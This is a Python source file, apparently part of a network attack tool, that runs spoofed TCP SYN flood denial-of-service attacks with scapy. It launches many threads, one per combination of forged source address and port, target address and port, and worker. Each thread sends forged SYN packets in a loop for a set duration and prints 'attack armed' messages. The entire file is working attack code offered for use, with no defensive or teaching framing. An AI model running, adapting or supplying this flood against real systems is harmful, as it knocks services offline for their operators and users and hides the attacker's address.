from scapy.all import IP, TCP, send

from threading import Thread
from time import time, sleep

from utils.RandNetParamsGen import GenerateRandomIp, GenerateRandomSafePort, GenerateRandomSafeSeq, GenerateRandomWindow
from utils.TimeUtils import timeStr2Secs


def scheduleSynFlood(args):
    '''
    Schedules Syn Flood attacks

    Arguments:
        args (Namespace): program arguments

    Returns:
        None
    '''
    if args.origin is None:
        args.origin = [GenerateRandomIp()]
    if args.origin_port is None:
        args.origin_port = [GenerateRandomSafePort()]

    jobs = []
    for origin in args.origin:
        for oport in args.origin_port:
            for target in args.target:
                for port in args.target_port:
                    for i in range(1, args.workers+1):
                        params = {'origin_ip': origin,
                                  'origin_port': oport,
                                  'target_ip': target, 
                                  'target_port': port, 
                                  'interface' : args.interface,
                                  'duration' : timeStr2Secs(args.duration), 
                                  'gap' : args.gap }
                        
                        jobs.append(Thread(target=doSynFlood, 
                                    kwargs=params, 
                                    name=(f"Attack #{i} for " 
                                          f"{params['target_ip']}:{params['target_port']} "
                                          f"from {params['origin_ip']}:{params['origin_port']} ")))
                        
                        print((f"[Attack Armed] Attack #{i} for " 
                               f"{params['target_ip']}:{params['target_port']} "
                               f"from {params['origin_ip']}:{params['origin_port']} " 
                               f"has been armed!!!"))
    
    print(f"Starting all {len(jobs)} attacks....")
    for job in jobs: # Start all job threads
        job.start()


def doSynFlood(origin_ip=None, origin_port=None, 
        target_ip=None, target_port=None, 
        interface=None, duration=None, gap=0):
    '''
    Starts Syn Flood attacks

    Arguments:
        origin_ip (str): attacker ip
        origin_port (int): attacker port
        target_ip (str): target ip
        target_port (int): target port
        interface (str): network interface to use
        duration (int): duration of the attack
        gap (int): gap (delay) between packets

    Returns:
        None
    '''
    
    # Check if everything is filled out
    if target_ip is None:
        return
    if target_port is None:
        return
    if duration is None:
        return
    if gap >= duration:
        return

    # Prepare the packet
    ip_layer = IP()
    ip_layer.src = origin_ip
    ip_layer.dst = target_ip

    tcp_layer = TCP()	
    tcp_layer.sport = origin_port
    tcp_layer.dport = target_port
    tcp_layer.flags = "S"
    tcp_layer.seq = GenerateRandomSafeSeq()
    tcp_layer.ack = GenerateRandomSafeSeq()
    tcp_layer.window = GenerateRandomWindow()

    attack_packet = ip_layer/tcp_layer

    # Prepare timings
    time_start = time()
    time_end = time_start + duration


    # Start attack
    while (time() <= time_end): #duration
        send(attack_packet, iface=interface)
        if gap > 0:
            sleep(gap) #gap
